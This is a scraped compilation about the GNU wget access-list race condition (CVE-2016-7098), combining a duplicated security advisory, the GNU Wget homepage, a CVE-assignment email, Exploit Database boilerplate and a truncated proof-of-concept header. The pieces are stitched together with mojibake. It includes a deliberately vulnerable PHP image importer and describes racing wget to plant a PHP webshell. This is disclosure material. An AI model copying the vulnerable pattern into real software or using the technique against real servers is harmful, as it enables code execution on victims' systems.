=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-7098
- Release date: 24.11.2016
- Revision 1.0
- Severity: Medium
=============================================

I. VULNERABILITY
-------------------------

GNU Wget < 1.18       Access List Bypass / Race Condition

II. BACKGROUND
-------------------------

"GNU Wget is a free software package for retrieving files using HTTP, HTTPS and
FTP, the most widely-used Internet protocols.
It is a non-interactive commandline tool, so it may easily be called from
scripts, cron jobs, terminals without X-Windows support, etc.

GNU Wget has many features to make retrieving large files or mirroring entire
web or FTP sites easy
"

<https://www.gnu.org/software/wget/>

III. INTRODUCTION
-------------------------

GNU wget in version 1.17 and earlier, when used in mirroring/recursive mode,
is affected by a Race Condition vulnerability that might allow remote attackers
to bypass intended wget access list restrictions specified with -A parameter.
This might allow attackers to place malicious/restricted files onto the system.
Depending on the application / download directory, this could potentially lead
to other vulnerabilities such as code execution etc.

IV. DESCRIPTION
-------------------------

When wget is used in recursive/mirroring mode, according to the manual it can
take the following access list options:

"Recursive Accept/Reject Options:
  -A acclist --accept acclist
  -R rejlist --reject rejlist

Specify comma-separated lists of file name suffixes or patterns to accept or
reject. Note that if any of the wildcard characters, *, ?, [ or ], appear in
an element of acclist or rejlist, it will be treated as a pattern, rather
than a suffix."

These can for example be used to only download JPG images.

It was however discovered that when a single file is requested with recursive
option (-r / -m) and an access list ( -A ), wget only applies the checks at the
end of the download process.

This can be observed in the output below:

# wget -r -nH -A '*.jpg' <http://attackersvr/test.php>
Resolving attackersvr... 192.168.57.1
Connecting to attackersvr|192.168.57.1|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: âtest.phpâ

15:05:46 (27.3 B/s) - âtest.phpâ saved [52]

Removing test.php since it should be rejected.

FINISHED

Although wget deletes the file at the end of the download process, this creates
a race condition as an attacker with control over the URL/remote server could
intentionally slow down the download process so that they had a chance to make
use of the malicious file before it gets deleted.

It is very easy to win the race as the file only gets deleted after the HTTP
connection is terminated. The attacker could therefore keep the connection open
as long as it was necessary to make use of the uploaded file as demonstrated
in the proof of concept below.

V. PROOF OF CONCEPT EXPLOIT
------------------------------

Here is a simple vulnerable PHP web application that uses wget to download
images from a user-provided server/URL:

---[ image_importer.php ]---

<?php
        // Vulnerable webapp [image_importer.php]
        // Uses wget to import user images from provided site URL
        // It only accepts JPG files (-A wget option).

        if ( isset($_GET['imgurl']) ) {
                $URL = escapeshellarg($_GET['imgurl']);
        } else {
                die("imgurl parameter missing");
        }

        if ( !file_exists("image_uploads") ) {
                mkdir("image_uploads");
        }

        // Download user JPG images into /image_uploads directory
        system("wget -r -nH -P image_uploads -A '*.jpg' $URL 2>&1");
?>

----------------------------

For example:
[https://victimsvr/image_importer.php?imgurl= href="http://images/logo.jpg">http://images/logo.jpg](https://victimsvr/image_importer.php?imgurl=<a)

will cause wget to upload logo.jpg file into:
<https://victimsvr/images_uploads/logo.jpg>

The wget access list (-A) is to ensure that only .jpg files get uploaded.

However due to the wget race condition vulnerability an attacker could use
the exploit below to upload an arbitrary PHP script to /image_uploads directory
and achieve code execution.

#
# Wget < 1.18  Access List Bypass / Race Condition PoC Exploit
# CVE-2016-7098
#
# Dawid Golunski
# <https://legalhackers.com>
#
#
# This PoC wget exploit can be used to bypass wget -A access list and upload a malicious
# file for long enough to take advantage of it.
# The exploit sets up a web server on port 80 and waits for a download request from wget.
# It then supplies a PHP webshell payload and requests the uploaded file before it gets
# removed by wget.
#
# Adjust target URL (WEBSHELL_URL) before executing.
#

VI. BUSINESS IMPACT
-------------------------

The vulnerability might allow remote servers to bypass intended wget access list
restrictions to temporarily store a malicious file on the server.
In certain cases, depending on the context wget command was used in and download
path, this issue could potentially lead to other vulnerabilities such as
script execution as shown in the PoC section.

VII. SYSTEMS AFFECTED
-------------------------

Wget < 1.18

VIII. SOLUTION
-------------------------

Update to latest version of wget 1.18 or apply patches provided by the vendor.

## GNU Wget

---

GNU Wget is a [free software](/philosophy/free-sw)
package for retrieving files using HTTP, HTTPS, FTP and FTPS, the most widely used
Internet protocols. It is a non-interactive commandline tool, so it may
easily be called from scripts, `cron` jobs, terminals without
X-Windows support, etc.

GNU Wget has many features to make retrieving large files or mirroring
entire web or FTP sites easy, including:

* Can resume aborted downloads, using `REST` and `RANGE`
* Can use filename wild cards and recursively mirror directories
* NLS-based message files for many different languages
* Optionally converts absolute links in downloaded documents to relative,
  so that downloaded documents may link to each other
  locally
* Runs on most UNIX-like operating systems as well as Microsoft Windows
* Supports HTTP proxies
* Supports HTTP cookies
* Supports persistent HTTP connections
* Unattended / background operation
* Uses local file timestamps to determine whether documents need to be re-downloaded when mirroring
* GNU Wget is distributed under the [GNU General Public License](/licenses/gpl.html).

### Downloading GNU Wget

The source code for GNU Wget can be found on the main [GNU download server](https://ftp.gnu.org/gnu/wget/) or (better)
on a [GNU mirror](http://ftpmirror.gnu.org/wget) near you.

For more download options, see the [FAQ](http://wget.addictivecode.org/FrequentlyAskedQuestions.html#download).

### Documentation

[GNU Wget documentation](/software/wget/manual/) is available online,
as are the [manuals of other GNU packages](/manual/).

### Additional Information

Currently GNU Wget2 is being developed.

Please help us if you can with testing, docs, organization, development, etc. See you at the [Wget2 collaboration site](https://gitlab.com/gnuwget/wget2).

### Maintainer

GNU Wget is currently being maintained
by Tim Rühsen, Darshit Shah and [Giuseppe Scrivano](https://www.scrivano.org).

The original author of GNU Wget is Hrvoje Nikšić.

**Please** do *not* directly contact either of these
individuals with bug reports, or requests for help with Wget: that is
what the [mailing
list](https://lists.gnu.org/mailman/listinfo/bug-wget) is for; please use it instead.

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> Wget Race Condition Recursive Download Accesslist Race Condition Vulnerability

Our perspective is that this is a very marginal issue for CVE
inclusion. Exploitation requires the victim to specify a potentially
dangerous file on the command line, and to enter this command line
while the current working directory is served by a web server. Also,
the observed behavior isn't directly inconsistent with the
documentation. However, the vendor apparently recognizes some security
risk and has decided to publish a patch described in the
<http://lists.gnu.org/archive/html/bug-wget/2016-08/msg00134.html> post.

Use CVE-2016-7098.

> wget -r -nH -A '*.jpg' <http://attackers-server/test.php>

Maybe a marginally realistic exploitation scenario is for the
attacker to convey this message to potential victims:

  I wrote a blog post about my summer vacation at
  <http://attackers-server/vacation.php> - this has links to dozens
  of photos that are .jpg files. If you have a slideshow application
  on your own server and just want to look at my photos, a simple
  method is to cd to your DocumentRoot directory, then cd to your
  slideshow directory underneath that, and then type this command:

     wget -r -nH -A '*.jpg' <http://attackers-server/vacation.php>

This is only marginally realistic for the following reasons:

  - It seems very odd to set one's working directory to a place
    underneath DocumentRoot, and then run wget with an untrusted .php
    URL on the command line - especially because the wget
    documentation is ambiguous (see below).

  - People don't ordinary ask their web-site visitors to create their
    own alternative content views (e.g., slideshows) on the visitors'
    web servers.

  - People don't ordinarily expect their web-site visitors to feel
    comfortable with wget commands. If they wanted to share a .jpg
    collection, they would probably create a .zip of it.

  - Although wget of an untrusted .php file with "-A '*.jpg'" might be
    somewhat common, it is probably not common for this to occur
    with a working directory under DocumentRoot. It seems to require
    an obscure use case in which the victim wants to mirror the .jpg
    files, but is willing to expend extra effort to host a unique web
    presentation of those .jpg files, just because mirroring the
    complete original presentation might be unsafe.

> the victim server's security is impacted since the
> developer/administrator was never warned explicitly that 'rejected
> files' can have a transient life on the victim server

The documentation only says "Specify comma-separated lists of file
name suffixes or patterns to accept or reject" during the recursive
retrieving. It does not discuss what happens to the filename that was
explicitly entered on the command line (stored forever, stored
temporarily, or never stored). It seems that, in many cases, a user
would prefer that file to be stored forever, so that they don't have
to create their own unique presentation. For example,

   wget -r -nH -A '*.jpg' <http://attackers-server/vacation.html>

can easily be interpreted to mean "I want to mirror the top-level
presentation file vacation.html, and I also want to mirror every .jpg
file that it references. I don't want a huge download time, so I've
decided to accept only the .jpg files, and not the .mp3 files of
birdsongs heard during the vacation, .mp4 movies of the birds, etc."
Probably wget has never supported that, but still it might be the
expected behavior.

Also, we're not sure how the 'asprintf (&tmp, "%s.tmp",
hs->local_file);' is supposed to interact with
<http://httpd.apache.org/docs/current/mod/mod_mime.html#multipleext> --
file.php.tmp is not necessarily a safe naming convention.

Finally, the patch does not address all possible security risks. For
example, if the victim's working directory is under DocumentRoot and
the victim is logged into the account used by the web server, then
there is still a possibility of malicious content from a

  wget -r -nH -A '*.jpg' <http://attackers-server/vacation.html>

command (e.g., malicious JavaScript). There is no CVE ID for that.

> <http://www.openwall.com/lists/oss-security/2016/08/12/7>

> We addressed this issue in wget2 - files just needed for parsing are kept in
> memory and never appear in the file system.

Again, interpreting "-A '*.jpg' <http://attackers-server/vacation.html>"
to mean no mirroring of vacation.html is a potential usability
problem. Ideally, there might be separate options for the different
use cases, e.g., something like

  --also-accept-the-file-named-on-the-command-line

or

  --do-not-also-accept-the-file-named-on-the-command-line

(but preferably with shorter option names!).

=============================================
- Discovered by: Dawid Golunski

- https://legalhackers.com
- https://legalhackers.com/advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html

- CVE-2016-7098
- Release date: 24.11.2016
- Revision 1.0
- Severity: Medium
=============================================

I. VULNERABILITY
-------------------------

GNU Wget < 1.18       Access List Bypass / Race Condition

II. BACKGROUND
-------------------------

"GNU Wget is a free software package for retrieving files using HTTP, HTTPS and
FTP, the most widely-used Internet protocols.
It is a non-interactive commandline tool, so it may easily be called from
scripts, cron jobs, terminals without X-Windows support, etc.

GNU Wget has many features to make retrieving large files or mirroring entire
web or FTP sites easy
"

https://www.gnu.org/software/wget/

III. INTRODUCTION
-------------------------

GNU wget in version 1.17 and earlier, when used in mirroring/recursive mode,
is affected by a Race Condition vulnerability that might allow remote attackers
to bypass intended wget access list restrictions specified with -A parameter.
This might allow attackers to place malicious/restricted files onto the system.
Depending on the application / download directory, this could potentially lead
to other vulnerabilities such as code execution etc.

IV. DESCRIPTION
-------------------------

When wget is used in recursive/mirroring mode, according to the manual it can
take the following access list options:

"Recursive Accept/Reject Options:
  -A acclist --accept acclist
  -R rejlist --reject rejlist

Specify comma-separated lists of file name suffixes or patterns to accept or
reject. Note that if any of the wildcard characters, *, ?, [ or ], appear in
an element of acclist or rejlist, it will be treated as a pattern, rather
than a suffix."

These can for example be used to only download JPG images.

It was however discovered that when a single file is requested with recursive
option (-r / -m) and an access list ( -A ), wget only applies the checks at the
end of the download process.

This can be observed in the output below:

# wget -r -nH -A '*.jpg' http://attackersvr/test.php
Resolving attackersvr... 192.168.57.1
Connecting to attackersvr|192.168.57.1|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: â€˜test.phpâ€™

15:05:46 (27.3 B/s) - â€˜test.phpâ€™ saved [52]

Removing test.php since it should be rejected.

FINISHED

Although wget deletes the file at the end of the download process, this creates
a race condition as an attacker with control over the URL/remote server could
intentionally slow down the download process so that they had a chance to make
use of the malicious file before it gets deleted.

It is very easy to win the race as the file only gets deleted after the HTTP
connection is terminated. The attacker could therefore keep the connection open
as long as it was necessary to make use of the uploaded file as demonstrated
in the proof of concept below.

V. PROOF OF CONCEPT EXPLOIT
------------------------------

Here is a simple vulnerable PHP web application that uses wget to download
images from a user-provided server/URL:

---[ image_importer.php ]---

<?php
        // Vulnerable webapp [image_importer.php]
        // Uses wget to import user images from provided site URL
        // It only accepts JPG files (-A wget option).

        if ( isset($_GET['imgurl']) ) {
                $URL = escapeshellarg($_GET['imgurl']);
        } else {
                die("imgurl parameter missing");
        }

        if ( !file_exists("image_uploads") ) {
                mkdir("image_uploads");
        }

        // Download user JPG images into /image_uploads directory
        system("wget -r -nH -P image_uploads -A '*.jpg' $URL 2>&1");
?>

----------------------------

For example:
https://victimsvr/image_importer.php?imgurl= href="http://images/logo.jpg">http://images/logo.jpg

will cause wget to upload logo.jpg file into:
https://victimsvr/images_uploads/logo.jpg

The wget access list (-A) is to ensure that only .jpg files get uploaded.

However due to the wget race condition vulnerability an attacker could use
the exploit below to upload an arbitrary PHP script to /image_uploads directory
and achieve code execution.

VI. BUSINESS IMPACT
-------------------------

The vulnerability might allow remote servers to bypass intended wget access list
restrictions to temporarily store a malicious file on the server.
In certain cases, depending on the context wget command was used in and download
path, this issue could potentially lead to other vulnerabilities such as
script execution as shown in the PoC section.

VII. SYSTEMS AFFECTED
-------------------------

Wget < 1.18

VIII. SOLUTION
-------------------------

Update to latest version of wget 1.18 or apply patches provided by the vendor.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## [Bug-wget] Wget - acess list bypass / race condition PoC

Hi,

I'm attaching the PoC to this email.
As you can see, this scenario doesn't require attacker to have access
to the filesystem (as was suggested earlier in the thread on
oss-security group) ,and  attacker is able to supply his URL as per
'import from URL' functionality which is common in many apps today.

Hope this helps. I'd like to publish the advisory as soon as possible
so please issue appropriate patches / update documentation if
possible.

Thanks.

| [Description](show_bug.cgi?id=995964#c0)  Alexander Bergmann   2016-08-29 08:20:14 UTC  ``` rh#1328137  A possible vulnerability was found in wget. The vulnerability surfaces when wget is used to download a single file with recursive option (-r / -m) and an access list ( -A ), wget only applies the list at the end of the download process.  Although the file get successfully deleted in the end, this creates a race condition situation as an attacker who has control over the URL, could slow down the download process so that he had a chance to make use of the malicious file before it gets deleted.

## What cybersecurity professionals are saying

     ![Duane LaFlotte](/_astro/duane.CAyBZp_-.png)
### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)

# Wget < 1.18 Access List Bypass / Race Condition PoC Exploit
# CVE-2016-7098
#
# Dawid Golunski
# https://legalhackers.com
#
#
# This PoC wget exploit can be used to bypass wget -A access list and upload a malicious
# file for long enough to take advantage of it.
# The exploit sets up a web server on port 80 and waits for a download request from wget.
# It then supplies a PHP webshell payload and requests the uploaded file before it gets
# removed by wget.
#
# Adjust target URL (WEBSHELL\_URL) before executing.
#
# Full advisory at:
